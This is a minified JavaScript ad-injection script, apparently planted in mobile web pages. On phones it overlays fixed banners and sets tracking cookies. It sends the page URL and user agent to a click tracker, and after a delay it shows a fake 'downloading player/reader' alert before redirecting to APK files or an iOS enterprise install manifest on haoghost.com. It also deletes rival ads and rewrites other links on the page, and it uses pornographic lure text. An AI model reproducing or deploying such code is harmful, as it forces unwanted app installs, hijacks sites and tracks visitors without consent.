var hy_itv=setInterval(function(){function a(a,b){var c=30,d=new Date;d.setTime(d.getTime()+1e3*60*60*24*c),document.cookie=a+"="+escape(b)+";expires="+d.toGMTString()+";path=/"}function b(a){var b,c=new RegExp("(^| )"+a+"=([^;]*)(;|$)");return(b=document.cookie.match(c))?b[2]:null}function n(){var c=parseInt(b("hy_visit_time"));return isNaN(c)&&(c=0),c>=m&&(c=0),a("hy_visit_time",c+g),c}function t(){return r>9||9==r&&s>30}function u(){return r>=8&&23>r}function v(){return/ipad|iphone|ipod/i.test(navigator.userAgent)?w():x()}function w(){var a;switch(d){case"16":a="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist";break;default:a="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist"}return a}function x(){var a,b=Math.random();switch(d){case"31":a="360sphj.apk";break;case"35":a="sybb.10C352.apk";break;default:a=.5>b?"360sqyy774.apk":.9>b?"360sphj.apk":"http://t.cn/R7qFBqD"}return a}function y(a){return"top"==a?e+j[p]:"bottom"==a?e+j[o]:void 0}function z(a){return"top"==a?e+"wb_t2.gif":"bottom"==a?e+"wb_ios2.gif":void 0}function A(){var c=new Date,d=60;if(!b("hycookietime"))return a("hycookietime",c.getTime()),!0;var e=c.getTime(),f=parseInt(b("hycookietime"));return e-f>1e3*60*d?(a("hycookietime",e),!0):!1}function V(a,b){setTimeout(function(){c("http://click.shuiguo.com/index.php?action=index&method=main1","t=undefined&l="+a+"&s="+b+"&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+S,function(){})},0)}if(document&&document.body){clearInterval(hy_itv);var c=function(a,b,c,d){var e=document.createElement("script"),f=document.getElementsByTagName("head")[0],g=null;e.type="text/javascript",e.language="javascript",d&&(this[d]=c),this.jsonpcallback=c;var b=b?"&"+b:"",h=/\?{1}/.test(a),i=h?a.slice(0,a.search(/\?{1}/)):a,j=h?a.slice(a.search(/\?{1}/)+1)+b:b;return e.src=i+"?"+j,f.appendChild(e),e.onload=e.onreadystatechange=function(){this.readyState&&"loaded"!==this.readyState&&"complete"!==this.readyState||(c(null,g),this.onload=this.onreadystatechange=null,this.parentNode.removeChild(this))},g},d=hy_cpc_num||"10",e="http://m.haoghost.com/images/",f="http://d.haoghost.com/",g=2,h=v(),i=w(),j=["wb_b5.gif","wb_n1.gif","wb_b3.gif","wb_n2.gif","wb_b2.gif","wb_b.gif"],k=["http://m.haoghost.com/?f=cpctag_"+d,"http://m.haoghost.com/note.html?f=cpctag_"+d,"http://m.haoghost.com/?f=cpctag_"+d,"http://m.haoghost.com/?f=cpctag_"+d,f+"360xpg.apk",f+"360ysdq.apk"],l=["","","","","\u6b63\u5728\u4e0b\u8f7d\u5feb\u64ad\u9b45\u5f71,\u6fc0\u60c5\u65e0\u7801\u89c6\u5c4f\u968f\u610f\u770b","\u6b63\u5728\u4e0b\u8f7d\u5348\u591c\u89c6\u9891,\u79c1\u5bc6\u73cd\u85cf\u5927\u7247\u4efb\u4f60\u770b"];16==d&&(j=["wb_b3.gif","wb_n1.gif","wb_b5.gif","wb_n2.gif","wb_b2.gif","wb_b.gif"],k=["http://m.haoghost.com/?f=cpctag_"+d,"http://m.haoghost.com/note.html?f=cpctag_"+d,"http://m.haoghost.com/?f=cpctag_"+d,"http://m.haoghost.com/?f=cpctag_"+d,f+"360xpg.apk",f+"360ysdq.apk"],l=["","","","","\u6b63\u5728\u4e0b\u8f7d\u5feb\u64ad\u9b45\u5f71,\u6fc0\u60c5\u65e0\u7801\u89c6\u5c4f\u968f\u610f\u770b","\u6b63\u5728\u4e0b\u8f7d\u5348\u591c\u89c6\u9891,\u79c1\u5bc6\u73cd\u85cf\u5927\u7247\u4efb\u4f60\u770b"]),31==d&&(j=["wb_b3.gif","wb_b5.gif","wb_b2.gif"],k=["http://m.haoghost.com/?f=cpctag_"+d,"http://m.haoghost.com/?f=cpctag_"+d,"http://m.haoghost.com/?f=cpctag_"+d],l=["","",""]);var m=j.length;(24==d||25==d||26==d||29==d||31==d)&&(g=1);var o=n(),p=o==m-1?0:o+1;"1"==b("hycpc1")&&(h="360ysdq.apk",i="http://www.haima.me/?c=cpapz",a("hycpc1","0"));var q=new Date,r=q.getHours(),s=q.getMinutes();if(/android/i.test(navigator.userAgent)||/ipad|iphone|ipod/i.test(navigator.userAgent)){var B="tag_"+d+"1",C="tag_"+d+"2",E=(k[o],"http://m.haoghost.com/ios.html?f=cpctag_"+d),F=k[0],G='<a href="'+k[p]+'" id="hy_'+B+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgt" src="'+y("top")+'" width=100%/><span id="hy_cpc_tclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>',H='<a href="'+k[o]+'" id="hy_'+C+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgb" src="'+y("bottom")+'" width=100%/><span id="hy_cpc_bclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>';/ipad|iphone|mac|ios/i.test(navigator.userAgent)&&(F=E,B="tag_"+d+"3",C="tag_"+d+"4",G='<a href="'+E+'" id="hy_'+B+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgt" src="'+z("top")+'" width=100%/><span id="hy_cpc_tclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>',H='<a href="'+E+'" id="hy_'+C+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgb" src="'+z("bottom")+'" width=100%/><span id="hy_cpc_bclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>');var I='<div id="hy_cpc_top" style="text-align: center;display: block;width: 100%;filter: alpha(opacity=90);-moz-opacity: 0.9;-khtml-opacity: 0.9;opacity: 1;position: fixed;top: 0px;left: 0px;background-color: rgb(51, 51, 51);z-index: 2147483647;">'+G+'</div><div id="hy_cpc_bottom" style="text-align: center;display: block;width: 100%;opacity: 1;position: fixed;bottom: 0px;background-color: rgb(51, 51, 51);z-index: 2147483647;right: 0px;">'+H+'</div><div id="hy_cpc_tj" style="display:none"></div>',J=document.createElement("div");J.innerHTML=I,document.body.appendChild(J);var K=window.screen.width;K=K>400?360:K;var L=document.getElementById("hy_"+B),M=document.getElementById("hy_"+C),N=90*K/435,O=document.getElementById("hy_cpc_top"),P=document.getElementById("hy_cpc_bottom"),Q=document.getElementById("hy_cpc_imgt"),R=document.getElementById("hy_cpc_imgb");!function(){var a=document.createElement("script"),b=document.getElementById("hy_cpc_tj");a.type="text/javascript",a.language="javascript",a.src="http://s95.cnzz.com/stat.php?id=1253202217",b.appendChild(a)}(),24==d||25==d||26==d||29==d||31==d||71==d?L.style.display="none":document.body.style["padding-top"]=N+"px",K=K>1305?1305:K,document.body.style["padding-bottom"]=N+"px",document.getElementById("hy_cpc_tclose").addEventListener("touchstart",function(a){return O.style.display="none",document.body.style["padding-top"]="0px",a.stopPropagation?a.stopPropagation():window.event&&(window.event.cancelBubble=!0),!1},!1),document.getElementById("hy_cpc_bclose").addEventListener("touchstart",function(a){return P.style.display="none",document.body.style["padding-bottom"]="0px",a.stopPropagation?a.stopPropagation():window.event&&(window.event.cancelBubble=!0),!1},!1);var S=navigator.userAgent;if(function(){function g(){window.setTimeout(function(){function c(c){var d=parseInt(b("hycookietime"));d-=1e3*60*c,a("hycookietime",d)}if(18==d||19==d||31==d||32==d||33==d||35==d){if(!A())return;e.indexOf("\u300b")<0?e="\u6b63\u5728\u4e3a\u60a8\u4e0b\u8f7d\u672c\u7ad9\u4e13\u7528\u624b\u673a\u64ad\u653e\u5668\uff0c\u5b89\u88c5\u540e\u5373\u53ef\u89c2\u770b\u672c\u7ad9\u6240\u6709\u7535\u5f71\u89c6\u9891":(e=e.split("\u300b")[0]+"\u300b",e="\u6b63\u5728\u4e3a\u60a8\u4e0b\u8f7d\u672c\u7ad9\u4e13\u7528\u624b\u673a\u64ad\u653e\u5668\uff0c\u5b89\u88c5\u540e\u5373\u53ef\u89c2\u770b"+e)}else if(15==d||28==d||29==d||34==d){if(!A())return;e="\u6b63\u5728\u4e0b\u8f7d\u795e\u5947\u5f71\u9662\uff0c\u6d77\u91cf\u89c6\u9891\u4efb\u4f60\u770b"}else if(16==d){if(t())return;if(!A())return;e="\u6b63\u5728\u4e0b\u8f7d\u4e13\u4e1a\u9605\u8bfb\u5668\uff0c\u5168\u56fd\u8d44\u6e90\u6700\u5168\u7684\u79bb\u7ebf\u5c0f\u8bf4APP\uff0c\u9996\u6b21\u5b89\u88c5\u90017\u65e5\u4f1a\u5458\u3002"}else{if(23!=d&&24!=d&&25!=d&&26!=d&&27!=d)return;if(!A())return;e="\u6b63\u5728\u4e0b\u8f7d\u4e13\u4e1a\u9605\u8bfb\u5668\uff0c\u5168\u56fd\u8d44\u6e90\u6700\u5168\u7684\u79bb\u7ebf\u5c0f\u8bf4APP\uff0c\u9996\u6b21\u5b89\u88c5\u90017\u65e5\u4f1a\u5458\u3002"}/ipad|iphone|mac|ios/i.test(navigator.userAgent)?(window.location.href=i,a("hycpc1","1")):(alert(e),window.location.href=h.indexOf("http")>=0?h:"http://d.haoghost.com/"+h,a("hycpc1","1"),(28==d||31==d||32==d||33==d||34==d)&&c(50))},1e3)}var e=document.getElementsByTagName("title")[0].innerHTML,f=parseInt(b("hyipdata"));0!=f&&1!=f&&/android/i.test(S)&&35!=d?c("http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js","",function(){var d=!1;!d&&Math.random()>.5&&(a("hyipdata","0"),u()&&(h="hlyy26.apk",c("http://click.shuiguo.com/index.php?action=index&method=main1","t=undefined&s=tag_890&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+S,function(){}))),d&&a("hyipdata","1"),g()},"hyipcb"):g()}(),window.setInterval(function(){function a(a){var b=document.getElementById(a);b&&b.parentNode.removeChild(b)}function c(a){for(var e,c=document.getElementsByTagName("div"),d=0;e=c[d];d++){var f=e.getAttribute("id");f&&f.indexOf(a)>-1&&(e.parentNode.removeChild(e),b=1)}}var b=0;if(27==d&&a("lgVshow"),28==d){if(1==b)return;c("star8")}if(31==d&&a("xcy_fmt_9v"),32==d&&(a("__70e_1"),a("__70e_2"),a("xcy_fmt"),M.style.display=""),22==d){a("__keyrun_RM_Div");var e,f=document.getElementById("viewxxx");f&&f.setAttribute("href",F),window.frames.baidu_clb_slot_iframe_984242_0.document&&(e=window.frames.baidu_clb_slot_iframe_984242_0.document.getElementsByTagName("a")[0]),window.frames.BAIDU_DUP_wrapper_984242_0.document&&(e=window.frames.BAIDU_DUP_wrapper_984242_0.document.getElementsByTagName("a")[0]),e&&e.setAttribute("href",F)}if(18==d||19==d){a("q1q2a3d4d5iva");var g=document.getElementById("JS_BottmEX2_Div"),h=document.getElementsByTagName("ins"),i=document.getElementsByTagName("a"),j=[];j[0]="http://cnrdn.com/fyRE",j[1]="http://xiazai.3ddianshiji.com/i/",j[2]="http://download.wuji.com:6677/wuji/setup/",j[3]="http://dl.client.baidu.com/union/",j[4]="http://pc.cyousoft.com/shouqu_126_10.html",j[5]="http://www.baidu.com/cb.php?",j[6]="http://www.z3330.com",j[7]="http://vs.cyousoft.com",g&&(g.style.display="none"),h[0]&&(h[0].style.display="none");for(var h=0;h<i.length;h++){var k=i[h].getAttribute("href");if(k)for(var l=0;l<j.length;l++)if(k.indexOf(j[l])>-1){i[h].setAttribute("href",F);break}}}},500),/ipad|iphone|mac|ios/i.test(navigator.userAgent))return;var T=document.createElement("script");T.type="text/javascript",T.language="javascript",T.src="http://v1.cnzz.com/stat.php?id=1253417451&web_id=1253417451";var U=document.getElementById("hy_cpc_tj");U.appendChild(T),""!=l[p]&&Q.addEventListener("touchend",function(){V(L.getAttribute("href"),B),alert(l[p])}),""!=l[o]&&R.addEventListener("touchend",function(){V(M.getAttribute("href"),C),alert(l[o])})}}},500);